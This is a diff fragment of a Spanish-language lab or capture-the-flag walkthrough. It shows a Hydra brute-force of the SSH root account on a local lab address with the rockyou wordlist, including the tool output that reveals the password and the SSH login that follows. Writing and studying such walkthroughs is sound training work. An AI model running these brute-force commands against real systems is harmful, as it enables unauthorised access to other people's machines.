@@ -71,3 +71,24 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 - `-l root`: Especifica el nombre de usuario "root" para el intento de inicio de sesión.
 - `-P /usr/share/wordlists/rockyou.txt`: Especifica la ubicación del archivo de contraseñas a utilizar. En este caso, se utiliza el archivo "rockyou.txt" como lista de contraseñas.
 - `ssh://172.17.0.2`: Indica el protocolo a utilizar (`ssh`) y la dirección IP del host objetivo (`172.17.0.2`). Esto establece el destino del intento de inicio de sesión mediante SSH.
+
+```bash
+❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-16 15:29:16
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: root   password: estrella
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.
+[ERROR] 3 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-16 15:29:49
+```
+Con hydra encontramos el password para el usuario root y nos conectamos por ssh a la máquina.
+
+```bash
+ssh root@172.17.0.2
+```
